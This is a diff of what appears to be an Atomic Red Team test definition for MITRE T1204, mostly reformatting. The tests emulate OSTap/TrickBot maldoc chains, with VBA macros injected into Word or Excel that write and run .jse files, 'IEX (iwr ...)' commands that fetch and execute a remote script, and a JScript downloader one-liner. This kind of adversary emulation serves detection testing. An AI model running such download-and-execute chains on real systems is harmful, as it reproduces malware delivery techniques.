@@ -1,10 +1,8 @@
----
-attack_technique: T1204
+attack_technique:
+- T1204
 display_name: User Execution
-
 atomic_tests:
 - name: OSTap Style Macro Execution
-  auto_generated_guid: 8bebc690-18c7-4549-bc98-210f7019efff
   description: |
     This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
     Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
@@ -12,38 +10,32 @@ atomic_tests:
     This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
     References:
       https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
-    ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-      type: String
-      default: "16.0"
-    ms_product:
-      description: Maldoc application Word or Excel
-      type: String
-      default: Word
     jse_path:
       description: |
         Path for the macro to write out the "malicious" .jse file
       type: String
-      default: 'C:\Users\Public\art.jse'
-
+      default: C:\Users\Public\art.jse
+    ms_product:
+      description: Maldoc application Word or Excel
+      type: String
+      default: Word
+    ms_office_version:
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      type: String
+      default: "16.0"
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
-      prereq_command: |
-        If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
-      get_prereq_command: |
-        $msword = New-Object -ComObject word.application
-        Stop-Process -Name WINWORD
-
+  - description: |
+      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+    prereq_command: |
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $msword = New-Object -ComObject word.application
+      Stop-Process -Name WINWORD
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
@@ -51,15 +43,12 @@ atomic_tests:
     cleanup_command: |
       if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
       Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
-
+    name: powershell
 - name: OSTap Payload Download
-  auto_generated_guid: 3f3af983-118a-4fa1-85d3-ba4daa739d80
   description: |
     Uses cscript //E:jscript to download a file
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     script_file:
       description: File to execute jscript code from
@@ -69,97 +58,81 @@ atomic_tests:
       description: URL to retrieve file from
       type: Url
       default: https://128.30.52.100/TR/PNG/iso_8859-1.txt
-
   executor:
-    name: command_prompt
-    elevation_required: false
     command: |
       echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
       cscript //E:Jscript #{script_file}
     cleanup_command: |
       del #{script_file} /F /Q >nul 2>&1
-
+    name: command_prompt
 - name: Maldoc choice flags command execution
-  auto_generated_guid: 0330a5d2-a45a-4272-a9ee-e364411c4b18
   description: |
     This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
     Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
-    ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-      type: String
-      default: "16.0"
     ms_product:
       description: Maldoc application Word or Excel
       type: String
       default: Word
-
+    ms_office_version:
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      type: String
+      default: "16.0"
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
-      prereq_command: |
-        If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
-      get_prereq_command: |
-        $msword = New-Object -ComObject word.application
-        Stop-Process -Name WINWORD
-
+  - description: |
+      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+    prereq_command: |
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $msword = New-Object -ComObject word.application
+      Stop-Process -Name WINWORD
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
       Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
     cleanup_command: |
       Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
-
+    name: powershell
 - name: OSTAP JS version
-  auto_generated_guid: add560ef-20d6-4011-a937-2c340f930911
   description: |
     Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
-    
+
     Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
-    ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-      type: String
-      default: "16.0"
+    jse_path:
+      description: jse file to execute with wscript
+      type: Path
+      default: C:\Users\Public\art.jse
     ms_product:
       description: Maldoc application Word or Excel
       type: String
       default: Word
-    jse_path:
-      description: jse file to execute with wscript
-      type: Path
-      default: 'C:\Users\Public\art.jse'
-
+    ms_office_version:
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      type: String
+      default: "16.0"
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
-      prereq_command: |
-        If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
-      get_prereq_command: |
-        $msword = New-Object -ComObject word.application
-        Stop-Process -Name WINWORD
-
+  - description: |
+      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+    prereq_command: |
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $msword = New-Object -ComObject word.application
+      Stop-Process -Name WINWORD
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
       Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
-
     cleanup_command: |
       if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
       Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+    name: powershell
+
